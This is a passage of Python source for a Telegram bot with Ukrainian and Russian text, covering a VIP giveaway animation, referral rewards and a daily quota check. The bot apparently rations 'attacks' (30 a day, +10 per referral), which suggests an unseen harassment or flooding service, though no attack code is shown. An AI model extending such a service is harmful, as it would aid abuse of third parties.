        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Фільтруємо активних користувачів (тех, кто не заблокировал бота)
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Запускаем анимацию поиска
        await run_giveaway_animation(chat_id, message_id, active_users)
        
    except Exception as e:
        logging.error(f"Помилка в розіграші: {e}")
        try:
            await bot.edit_message_text(
                "❌ Сталася помилка при проведенні розіграшу!",
                chat_id=chat_id,
                message_id=message_id
            )
        except Exception as edit_error:
            logging.error(f"Помилка при редагуванні повідомлення: {edit_error}")
            try:
                await bot.send_message(chat_id, "❌ Сталася помилка при проведенні розіграшу!")
            except Exception as send_error:
                logging.error(f"Помилка при відправленні повідомлення: {send_error}")
    finally:
        giveaway_flags[chat_id] = False

async def run_giveaway_animation(chat_id: int, message_id: int, active_users: list):
    """Анимация розыгрыша с прогресс-баром"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "🎲 Крутится колесо фортуны...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        if not giveaway_flags.get(chat_id):
            return
        
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25     
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш VIP-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Помилка оновлення повідомлення на кроці {step}: {e}")
            # Якщо не можемо редагувати, пропускаємо цей крок
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
        display_name = f"{winner_name} (@{winner_username})"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
        display_name = winner_name
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу VIP-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального повідомлення: {e}")
        # Якщо не можемо відредагувати, надсилаємо нове повідомлення
        try:
            await bot.send_message(chat_id, final_text, parse_mode='HTML')
        except Exception as send_error:
            logging.error(f"Помилка при відправленні фінального повідомлення: {send_error}")

async def run_inline_giveaway_animation(inline_message_id: str, active_users: list):
    """Анимация розыгрыша для inline-сообщений"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "✨ Определяю победителя...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25
        
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш VIP-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                inline_message_id=inline_message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Ошибка обновления inline-сообщения на шаге {step}: {e}")
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу VIP-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            inline_message_id=inline_message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального inline-повідомлення: {e}")

# Додаю функцію для нарахування реферальних атак
async def process_referral(referrer_id, user_id, username, name):
    if not referrer_id:
        return
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
            referrer_id, user_id
        )
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
            referrer_id
        )
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
            user_id
        )
        try:
            ref_name = username or name or f"User{user_id}"
            await bot.send_message(
                referrer_id,
                f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак!", parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Error notifying referrer {referrer_id}: {e}")

@dp.message_handler(text='❓ Перевірити атаки')
async def check_user_attacks(message: types.Message):
    user_id = message.from_user.id
    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
    total = attacks_left + promo_attacks + referral_attacks
    text = f'Ваші атаки на сьогодні:\n\n' \
           f'Звичайних атак: {attacks_left}\n' \
           f'Промо атак: {promo_attacks}\n' \
           f'Реферальних атак: {referral_attacks}\n' \
           f'Всього: {total} з 30 можливих.'
    await message.answer(text)

if __name__ == '__main__':
    logging.info("Запуск бота...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True)
